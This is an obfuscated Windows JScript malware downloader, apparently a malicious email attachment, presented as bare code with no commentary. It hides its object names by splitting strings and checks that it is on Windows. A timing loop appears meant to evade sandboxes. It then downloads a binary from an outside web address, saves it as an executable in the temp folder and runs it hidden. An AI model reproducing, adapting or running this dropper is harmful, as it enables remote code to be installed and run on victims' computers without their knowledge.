var HB = false;
var R = "Create"+"Object";
var CI = function V() {return WScript[R]("WScript"+".Shell");}(), R1 = 11;
var CA = "MSXML2"+".XMLHTTP";
var PI = 2;
var PC = PI - 2;
function BJ(V0){CI["Run"](V0, PC, PC);};
function G(){return CA + "";};
function C(ED, L){PC = PC * 1; return ED - L;};
function DC(){return R;};
/*@cc_on
  @if (@_win32 || @_win64)
    HB = true;
  @end
@*/
if (HB)
{
var DF = "";
function I(){return 22;};
var ES = 0; var A = 0;
function DY()
{
var U = new this["Date"]();
var AF = U["getUTCMilliseconds"]();
WScript["Sleep"](I());
var U = new this["Date"]();
var AA = U["getUTCMilliseconds"]();
WScript["Sleep"](I());
var U = new this["Date"]();
var BV = U["getUTCMilliseconds"]();
var ES = "AM";
ES = C(AA, AF);
var A = "VY";
A = C(BV, AA);
DF = "open";
return C(ES, A);
}
var I0 = false;
var W = false;
for (var R0 = PC; R0 < I() * 1; R0++){if (DY() != PC){
I0 = true; 
A = "31" + 11 * ES + A; 
W = true; 
break;
}}
function M() {return ((I0 == true) && (I0 == W)) ? 1 : PC;};
if (I0 && M() && W){
function Y() {return CI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zNtUGPK1lYwC.ex" + "e";};
 S = G();
 CY = WScript[R](S);
 var OM = 1;
do { 
	for (;OM;){
	try {
		if (OM == 1)
		{
			CY[DF]("GET", "http://drirenaeris.com.au/b7eir", false);
			CY["send"]();
			F = "Sleep";
			OM = 2;
		}
		WScript[F](I() + 120); 
		if (CY["readystate"] < 2 * 2) continue;
		OM = PC;
		function EU(PQ) {var XT = (1, 2, 3, 4, 5, PQ); return XT;};
		UJ = WScript[DC()]("ADODB.Stream");
		S = UJ;
		S[DF]();
		S["type"] = EU(1);
		S["write"](CY["ResponseBody"]);
		UJ["position"] = EU(PC);
		S["Save" + "ToFile"](Y(), 2);
		UJ["cl"+"ose"]();
		VJ = Y();
		BJ(VJ);
	} catch(TV){};};
}while (OM);
}
}

